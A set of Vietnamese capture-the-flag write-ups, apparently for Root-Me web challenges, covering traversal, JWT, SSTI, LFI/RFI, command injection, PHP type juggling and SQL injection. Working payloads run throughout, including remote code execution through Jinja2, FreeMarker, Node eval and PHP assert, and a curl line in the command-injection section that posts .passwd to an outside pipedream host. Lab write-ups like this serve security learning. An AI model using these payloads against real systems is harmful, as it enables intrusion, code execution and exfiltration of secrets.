## 21. Directory traversal
- Bài này dò path ẩn qua truyền tham số vào biến galerie=.
- Phát hiện được 1 path lạ 86hwnX2r
```js
<table id="content">
        <tr>
            <td><img width="64px" height="64px" src="galerie//86hwnX2r" alt="86hwnX2r">
            </td>
        </tr>
        <tr>
            <td><img width="64px" height="64px" src="galerie//emotes" alt="emotes">
            </td>
            <td><img width="64px" height="64px" src="galerie//apps" alt="apps">
            </td>
            <td><img width="64px" height="64px" src="galerie//devices" alt="devices">
            </td>
        </tr>
        <tr>
            <td><img width="64px" height="64px" src="galerie//categories" alt="categories">
            </td>
            <td><img width="64px" height="64px" src="galerie//actions" alt="actions">
            </td>
        </tr>
    </table>
```
- Vô xem thì có file password đọc thôi
```js
<table id="content">
    <tr></tr>
    <tr>
        <td><img width="64px" height="64px" src="galerie/86hwnX2r/password.txt" alt="password.txt">
        </td>
        <td><img width="64px" height="64px" src="galerie/86hwnX2r/hacked_web.jpg" alt="hacked_web.jpg">
        </td>
        <td><img width="64px" height="64px" src="galerie/86hwnX2r/secret.png" alt="secret.png">
        </td>
    </tr>
    <tr></tr>
</table>
```
```js
Password: kcb$!Bx@v4Gs9Ez
```
## 22. File upload - Null byte
- Bài này lỗi ở kí tự null byte vì nó chỉ check đuôi file đến khi gặp kí tự null byte là dừng lại không check nữa nên chỉ cần chèn null byte vô tên file là thành công(injec.php%00.png)
- Lỗi này đã được fix từ phiên bản PHP 5.3.
![Screenshot 2022-05-13 122507](https://i.imgur.com/qne6vo0.png)
![Screenshot 2022-05-13 122521](https://i.imgur.com/67YXMTy.png)
```js
Password: YPNchi2NmTwygr2dgCCF
```
## 23. JSON Web Token (JWT) - Weak secret
- Vào đầu tiên thì họ có đưa một đoạn mess
```js
{"message": "Let's play a small game, I bet you cannot access to my super secret admin section. Make a GET request to /token and use the token you'll get to try to access /admin with a POST request."}
```
- Thì theo đường path /token thì có đưa một đoạn token jwt và yêu cầu POST bằng token đó.
```js
{"Here is your token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"}
```

- Sau khi post vô /admin thì nhận được mess này
```js
{"message": "method to authenticate is: 'Authorization: Bearer YOURTOKEN'"}
```
- Thêm trường Authorization vô thì nhận tiếp
```js
{"message": "I was right, you are not able to break my super crypto! I use HS512 so no need to have a strong secret!"}
```
- Vô jwt.io để xem trong token có gì 
```js
{"role": "guest"}
```
- Cần thay đổi role thành admin nhưng không có private key nêu do bài yêu cầu brute force password nên dùng jwt_tool để tìm.
![Screenshot 2022-05-14 150511](https://i.imgur.com/f1pgEMn.png)
- Private key là "lol" vậy chỉ cần mã hóa là xong.
![Screenshot 2022-05-14 150745](https://i.imgur.com/fbBgThl.png)
![Screenshot 2022-05-14 150758](https://i.imgur.com/HhdLGkp.png)

```js
Password: PleaseUseAStrongSecretNextTime
```
## 24. JWT - Revoked token
- Đầu tiên vô thì họ cho mess này
```js
POST : /web-serveur/ch63/login <br>
GET : /web-serveur/ch63/admin
```
- POST với login thì nhận được cần phải login dạng json
```js
{"msg":"Bad request. Submit your login / pass as {\"username\":\"admin\",\"password\":\"admin\"}"}
```
- Đăng nhập thì nhận được một token để login vô admin.
![Screenshot 2022-05-14 153527](https://i.imgur.com/igzNIiP.png)
- Vô trang login admin bằng token xem nhận được token bị revoked.
- Để ý đoạn code đề bài cho thì ngay khi đăng nhập thành công thì lập tức token bị cho vào black_list
```python
def login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
    except:
        return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
 
    if username != 'admin' or password != 'admin':
        return jsonify({"msg": "Bad username or password"}), 401
 
    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
    ret = {
        'access_token': access_token,
    }
   
    with lock:
        blacklist.add(access_token)
 
    return jsonify(ret), 200
```
- Do đó khi kiểm tra thì token tại trường Authorization bị dính do đó cần bypass đoạn Authorization.
```python
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({"msg":"Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
```
- Theo như trường Authorization thì giá trị token sẽ bị base64 decode để đọc giữ liệu. Trong khi đó các kí tự "=" có thể bypass được vậy thêm dấu "=" vô sau token là được.

```python
{"Congratzzzz!!!_flag:":"Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld"}
```
## 25. PHP - assert()
- Đầu tiên vô trang index thì phát hiện path đều được truyền qua tham số ?page= điền ?page=' thì xuất hiện 1 lỗi.
```php
Parse error: syntax error, unexpected T_CONSTANT_ENCAPSED_STRING in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: strpos('includes/'.php', '..') === false in /challenge/web-serveur/ch47/index.php on line 8
``` 
- Có thể thấy được cú pháp của server là
```php
assert(strpos('include/'.$file.'.php', '..') === false)
```
- Inject vào thôi điền
```php
?page=test' , '') or system('ls -a');//
Lúc đó server sẽ trở thành
assert(strpos('include/test.php', '') or system(ls -a); // '..') === false)
```
- Và hiện file .passwd và đọc thôi

```js
Warning: strpos(): Empty delimiter in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 . .. ._nginx.http-level.inc ._nginx.server-level.inc ._perms ._php53-fpm.pool.inc .git .passwd includes index.php 'includes/alo' ,'') or system("ls -a");//.php'File does not exist

Thay lệnh cat .passwd ra flag

Warning: strpos(): Empty delimiter in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 The flag is / Le flag est : x4Ss3rT1nglSn0ts4f3A7A1Lx Remember to sanitize all user input! / Pensez à valider toutes les entrées utilisateurs ! Don't use assert! / N'utilisez pas assert ! 'includes/alo','') or system("cat .passwd");//.php'File does not exist
```

```js
Password: x4Ss3rT1nglSn0ts4f3A7A1Lx
```

## 25. PHP - Filters
- Bài này là về Filter wrapper trong PHP stream đọc hiểu stream PHP tại:
https://viblo.asia/p/tim-hieu-ve-streams-trong-php-63vKjmaM52R
- Đây là một dạng LFI 
- PHP filter được dùng để xác thực và làm sạch đầu vào bên ngoài. Có rất nhiều filter có thể được dùng. Một trong số đó là convert.base64-encode và base64-decode.
- php://filter/convert.base64-encode/resource cho phép chúng ta đọc bất kì file php nào. Tuy nhiên chúng sẽ được mã hóa base-64. Và chúng ta phải decode nó để có thể xem source các file
- Thử dùng đầu tiên cho file login.php
```js
?inc=php://filter/convert.base64-encode/resource=login.php
- Được chuỗi
PD9waHAKaW5jbHVkZSgiY29uZmlnLnBocCIpOwoKaWYgKCBpc3NldCgkX1BPU1RbInVzZXJuYW1lIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzc3dvcmQiXSkgKXsKICAgIGlmICgkX1BPU1RbInVzZXJuYW1lIl09PSR1c2VybmFtZSAmJiAkX1BPU1RbInBhc3N3b3JkIl09PSRwYXNzd29yZCl7CiAgICAgIHByaW50KCI8aDI
- Base64 decode
<?php
include("config.php"); ...
```
- Có file config.php rồi làm như trên vào là có flag
```js
?inc=php://filter/convert.base64-encode/resource=config.php
- Chuỗi
PD9waHAKJHVzZXJuYW1lPSJhZG1pbiI7CiRwYXNzd29yZD0iREFQdDlEMm1reTBBUEFGIjsK
- Base64 decode
$username="admin";
$password="DAPt9D2mky0APAF";
```

## 26. PHP - register globals
- Register globals là một số biến globals như $_GET, $_POSRT, $_SESSION,..
- Xem phần gợi ý có thấy người lập trình đã để lại tập backup lại.
- Dùng dirsearch để tìm file thì thấy có file index.php.bak.
- Tải về và đọc chú ý đoạn đăng nhập
```js
if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){
    $aff=display("well done, you can validate with the password : $hidden_password");
} else {
    $aff=display("try again");
}
```
- Có 2 cách để đăng nhập nhưng mình không biết password nên chỉ có thể đăng nhập bằng SESSION thì chỉ cần cài cái $_SESSION["logged"]==1 là xong.
```js
http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1

well done, you can validate with the password : NoTQYipcRKkgrqG
```

## 27. PHP - Remote Xdebug
- Xdebug là một extension dành cho PHP, khi cài đặt nó nó sẽ cập nhật lại việc hiện thị lỗi, cập nhật một số lệnh có sẵn (như var_dump), đặc biệt nó cho phép kết nối đến các IDE (như Visual Studio Code, PHPStorm ...) để gỡ rối mã PHP, lúc này từ IDE có thể thực hiện việc đặt các breakpoint (điểm dừng mã để trích xuất, xem các thông tin ...) cũng như các thao tác Debug như : Step Into, Step Over, Restart ...


## 28. Python - Server-side Template Injection Introduction
- Nghe đề bài trông quen quen thì vô họ cho 2 input là title và conten.
- Vì đây là template injection nên kiểm tra {{7*7}} thì hiện 49 và {{7*'7'}} hiện 7777777 biết ngay là jinja2.
- Xem payload ở đây 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

```js
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -a').read() }}

{"content":".\n..\n._firewall\n.git\n._nginx.server-level.inc\n.passwd\n._perms\nrequirements.txt\n._run\nserver_ch74.py\nstatic\ntemplates\n","title":"aa"}
```
- Có file .passwd đọc lên là có flag
```js
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat .passwd').read() }}

{"content":"Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!\n","title":"aa"}
```
## 29. File upload - ZIP
- Đầu tiên vô trang thì thấy có 1 form upload file zip đưa file zip bình thường sẽ bị đổi tên.
- Thì đưa file zip text sẽ giải nén và đọc.
- File zip chứa php ko thực thi được trong thư mục upload (403 Forbidden).
```js
$zip –m filename.zip file.txt
```
- Cách làm là upload 1 file chứa liên kết symlink với file index.php là có thể đọc được.
![Screenshot 2022-05-20 100105](https://i.imgur.com/sPZVRDz.png)

```js
- Tạo 1 file index.txt. Vì file index.php nằm cách 3 thư mục sau uploads ch51/tmp/upload/628704ff631c53.92359809/
ln -s ../../../index.php index.txt
zip --symlinks index.zip index.txt
```
- Upload file đó lên là có thể đọc được.
```js
Don't know if this is safe, but it works, someone told me the flag is N3v3r_7rU5T_u5Er_1npU7 , did not understand what it means
```
## 30. Command injection - Filter bypass
- Bài này giống bài đầu nhưng khi ping đúng ip thì chỉ hiện ping OK.
- Thì tìm được payload list command tại 
https://github.com/payloadbox/command-injection-payload-list
- Ở đây dùng %0A để tạo lệnh mới vì dùng ; để ngắt lệnh thì sẽ hiện Syntax Error vì các lệnh trên đã bị filter.
- Và tất cả các lệnh ping đều bị blind nên dùng request bin để bắt request.
- Cách đọc file với curl và đề có hướng dẫn đọc file index.php
```js
curl --data "@/path/to/filename" http://....

ip=127.0.0.1+%0A+curl+--data+"@index.php"+https://eoje6sdrijfzw1h.m.pipedream.net
```
![Screenshot 2022-05-20 103721](https://i.imgur.com/spbJtIl.png)
- Đọc file .passwd là có flag
```js
ip=127.0.0.1+%0A+curl+--data+"@.passwd"+https://eoje6sdrijfzw1h.m.pipedream.net

body
{1}
Copy Path
•
Copy Value
Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!:
```
## 31. Java - Server-side Template Injection
- Đây là lỗi thực thi code template đi theo hình này thôi.
![Screenshot 2022-05-20 132246](https://i.imgur.com/oPyCyAT.png)
```js
${7*7} => It's seems that I know you :) 49
a{*comment*}b => It's seems that I know you :) a{*comment*}b
${"z".join("ab")} =>
{"timestamp":1653027964406,"status":500,"error":"Internal Server Error","exception":"freemarker.core.ParseException","message":"Syntax error in template \"5b375e31-2d6b-49d1-88b6-e6c23fa1d027\" in line 1, column 54:\nFound string literal: \"z\". Expecting: hash","path":"/web-serveur/ch41/check"}
```
- Ta tìm thấy freemarker. FreeMarker là một hệ bản mẫu web cho nền tảng Java, mục đích ban đầu dùng để tạo dựng web động với kiến trúc MVC.
- Mục tiêu là Java template injection.
- Sau một hồi tìm kiếm tên mạng thì tìm được payload này để thực hiện RCE.
```js
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```
- Và nó chạy hiệu quả vậy chỉ cần liệt kê và đọc file flag là được.

```js
nickname=<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls -a") }
=> ..
.git
.gitignore
._nginx.server-level.inc
.oracle_jre_usage
._perms
pom.xml
._run
SECRET_FLAG.txt
src
target

nickname=<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat SECRET_FLAG.txt") }
=> It's seems that I know you :)  B3wareOfT3mplat3Inj3ction
```

## 33. Local File Inclusion
- Đọc tên đề là tấn công LFI thì dùng payload bình thường để đọc các file cha thôi.
```js
files=..
=> Ta tìm được file admin và index.php
  if (isset($_GET["f"]) && $_GET["f"]!=""){

	$lfi_path=$full_path."/".$_GET["f"];
	$secured_path=realpath($lfi_path);
	$aff.= "<h3>File : ".htmlentities($_GET["f"])."</h3>";
	$aff.= "<hr/><pre>";
	$aff.= htmlentities(file_get_contents($secured_path));
	$aff.= "</pre><hr/>";

	
    }
```
- PHP sẽ dùng hàm file_get_contents(path) để đọc file vậy chỉ cần đọc file admin sẽ thấy file index.php đọc là có flag.
```js
files=../admin
=> $users = array('admin' => 'OpbNJ60xYpvAQU8');
```
## 34. Local File Inclusion - Double encoding
- Bài này sử lý gần giống như PHP filter.
- Vẫn thử LFI ../ nhưng đã bị filter và hiện Attack detected. Chắc nhìn đề bài là double encoding thì có lẽ các kí tự đặc biệt kia đã bị encode rồi và thử 1 số payload tại 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- Có vẻ như thông báo lỗi là có thể khai thác được.
- Dùng stream filter php://filter/convert.base64-encode/resource=cv nhưng không thành công nhìn đề bài encode 2 lần và đã đọc được.
- Danh sách kí tự đặc biệt
```js

simbol : simple encoding : double encoding

:      	: 3A	: %253A

/	: 2F	: %252F

.	: 2E	: %252E

-	: 2D	: %252D

=	: 3D	: %253D
```
- Payload
```js
page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv
- Được 1 chuỗi base64 encode ra tìm được 1 file conf.init.php
<?php include("conf.inc.php"); ?>
```
- Vậy đọc file trên là ra flag. Vì file được truyền khởi tạo bởi tham số nên không cần ghi tên đuôi vì nó sẽ tự truyền vào cho mình.
```js
page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253Dconf
    "flag"        => "Th1sIsTh3Fl4g!",
    "home"        => '<h2>Welcome</h2>
```

## 35. Node - Eval
- Đây là bài về lỗi eval trong js.
- Hàm eval(string) sẽ tính toán nếu là chuỗi tính toán và thực thi code nếu là script.
- Vì đề là nodejs nên thử truyền vào 1 hàm xem sao.
```js
res.end("abcd")
```
- Và trang web đã hiện lên "abcd" chứng tỏ chỉ cần thực thi cmd vào là được.
```js
res.end(require('child_process').spawnSync('ls',['-la']).stdout.toString())
- Thêm module child_process vào và thực hiện command là được.
```
- Đã liệt kê được file vậy chỉ còn đọc flag là được.
![Screenshot 2022-05-20 165356](https://i.imgur.com/tVk0kBk.png)
- Về module của child_process có thể tìm hiểu tại
https://nodejs.org/api/child_process.html#child_processspawnsynccommand-args-options
- Dùng module 'fs' để đọc file.
```js
- Trong file S3cr3tEv0d3f0ld3r còn file nữa 
- Dùng để đọc filepath
res.end(require('fs').readdirSync('./S3cr3tEv0d3f0ld3r').toString())
- Dùng để đọc tên file
res.end(require('fs').readFileSync('./S3cr3tEv0d3f0ld3r/Ev0d3fl4g').toString())
```
```js
Password: D0n0tTru5tEv0d3B4nK!
```

## 36. PHP - Loose Comparison
- Mở bài thì họ cho 2 cái input vì cho source để đọc lên.
```js
<?php
function gen_secured_random() { // cause random is the way
    $a = rand(1337,2600)*42;
    $b = rand(1879,1955)*42;
    $a < $b ? $a ^= $b ^= $a ^= $b : $a = $b;
    return $a+$b;
}
function secured_hash_function($plain) { // cause md5 is the best hash ever
    $secured_plain = sanitize_user_input($plain);
    return md5($secured_plain);
}
function sanitize_user_input($input) { // cause someone told me to never trust user input
    $re = '/[^a-zA-Z0-9]/';
    $secured_input = preg_replace($re, "", $input);
    return $secured_input;
}
if (isset($_GET['source'])) {
    show_source(__FILE__);
    die();
}
require_once "secret.php";

if (isset($_POST['s']) && isset($_POST['h'])) {
    $s = sanitize_user_input($_POST['s']);
    $h = secured_hash_function($_POST['h']);
    $r = gen_secured_random();
    if($s != false && $h != false) {
        if($s.$r == $h) {
            print "Well done! Here is your flag: ".$flag;
        }
        else {
            print "Fail...";
        }
    }
    else {
        print "<p>Hum ...</p>";
    }
}
?>
```
- Thuật toán là nhập seed và hash
```js
$r: chỉ là số random
$s: là input của seed sau khi lọc data.
$h: là md5 của seed.
```
- Đọc qua về lỗ hổng của so sánh lỏng lẻo(Loose Comparison) "==" có thể xem chi tiết tại đây.
https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20loose%20comparison%20-%20Type%20Juggling%20-%20OWASP.pdf
- Thì có một số lỗi của "==" so với "===" như sau:
```js
TRUE: "0000" == int(0)
▪ TRUE: "0e12" == int(0)
▪ TRUE: "1abc" == int(1)
▪ TRUE: "0abc" == int(0)
▪ TRUE: "abc" == int(0) // !!
TRUE: "0e12345" == "0e54321"
▪ TRUE: "0e12345" <= "1"
▪ TRUE: "0e12345" == "0"
▪ TRUE: "0xF" == "15"
```
- Đó như vậy chú ý trên muốn hiện flag thì phải bypass qua điều kiện này 
```js
$s.$r == $h
$s.$r là nối chuỗi nên random không cần phải chú ý.
```
- Vì lỗ hổng ở TRUE: "0e12345" == "0e54321" theo đọc thì "0e" có nghĩa là 0 mũ mà 0 mũ bao nhiêu cũng bằng nhau nên có thể để cho 2 vế là 0 mũ.
```js
$s: có thể điền "0e" được bây giờ để bằng $h thì $h cần phải chứa "0e" cái này brute force tay.
```
- Đoạn code python
```py
import hashlib
import re
for i in range(0,9999999999):
    md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest()
    # reget là xác nhận phù hợp input đầu vào
    reget = re.match("^[0-9]+$",md5[3:])
    if md5[0:2] == "0e" and reget:
        print("Seed: " + str(i) + " and Hash: " + md5)
        break
    else:
        print("None: " + str(i))
s
```
- Brute force hơi lâu nên lên mạng tìm và tìm được "240610708"
- Nhập vô là thành công.
```js
sead: 0e
hash: 240610708

Well done! Here is your flag: F34R_Th3_L0o5e_C0mP4r15On
```
## 37. PHP - preg_replace()
- Hàm preg_replace dùng để replace một chuỗi nào đó khớp với đoạn Regular Expression truyền vào.
```js
preg_replace ( $pattern, $replacement, $subject)
```
- Đây là tấn công hàm preg_replace() có thể xem cách khai thác tại
http://www.madirish.net/402
- Với việc truyền thêm /e (đề bài có gợi ý) thì hàm trên sẽ thực thi hàm $subject truyền vào vậy nếu ta thay thế bằng mã độc thì sẽ rất nguy hiểm.
- Còn nếu không có /e thì nó chỉ là chuỗi bình thường.
- Payload:
```js
search: /a/e
replace: file_get_contents('flag.php') vì các hàm system(), exec(),... bị filter.
content: a

=><?php $flag="".file_get_contents(".passwd").""; ?>
search: /a/e
replace: file_get_contents('.passwd')
content: a
```
```js
Password: pr3g_r3pl4c3_3_m0d1f13r_styl3
```

## 38. PHP - type juggling
- Bài này là do câu so sánh có vấn đề
```js
if($auth['data']['login'] == $USER && !strcmp($auth['data']['password'], $PASSWORD_SHA256)){
        $return['status'] = "Access granted! The validation password is: $FLAG";
    }
```
- Ở đây lỗi là cách sử dụng hàm strcmp() có thể tham khảo ở đây
https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20PHP%20loose%20comparison%20-%20Type%20Juggling%20-%20OWASP.pdf

![Screenshot 2022-05-20 212523](https://i.imgur.com/ZNs8fyl.png)

![Screenshot 2022-05-20 212646](https://i.imgur.com/NL0pkpb.png)
- Như vậy chỉ cần truyền mảng vào password và truyền login = 0 thì 2 giá trị Null có thể bypass được rồi.
```js
{"data":{"login":0,"password":["aaa"]}}
%7b%22%64%61%74%61%22%3a%7b%22%6c%6f%67%69%6e%22%3a%30%2c%22%70%61%73%73%77%6f%72%64%22%3a%5b%22%61%61%61%22%5d%7d%7d

{"status":"Access granted! The validation password is: DontForgetPHPL00seComp4r1s0n\n"}
```
## 39. Remote File Inclusion
- Đầu tiên thì cho truyền tham số với lang= chắc là truyền file.
- LFI bình thường ../../../index.php thì bị báo lỗi
```js
 Failed opening '../../../index.php_lang.php'
```
- Có lẽ bị tự động thêm đuôi _lang.php ta có thể hình dung được code là.
```js
include($language."_lang.php");
```
- Dùng stream filter LFI nhưng cũng không thành công vậy chỉ còn RFI thôi.
- Thử chuyển hướng sang google.com xem sao.
```js
?lang=https://google.com?
- Ở đây để bypass cái thêm chuỗi _lang.php thì sau khi mò trên mạng tìm thấy được SUFFIX là dùng "?"
```
- Và đã chuyển thành công sang google.com
![Screenshot 2022-05-20 151048](https://i.imgur.com/bJWdBem.png)
- Ở đây dùng pastebin để share code nhớ dùng bản raw để đỡ hiện những phần thừa![Screenshot 2022-05-20 151136](https://i.imgur.com/kHd0Xgr.png)
- Payload:
```js
?lang=https://pastebin.com/raw/Hc61Dy9h?
```
![Screenshot 2022-05-20 151407](https://i.imgur.com/ydXifJR.png)
## 40. SQL injection - Authentication
- Đầu tiên họ cho form đăng nhập thì vì lỗi SQL bình thường nên payload
```js
username = admin'--
password = admin
```
```js
Password: t0_W34k!$
```


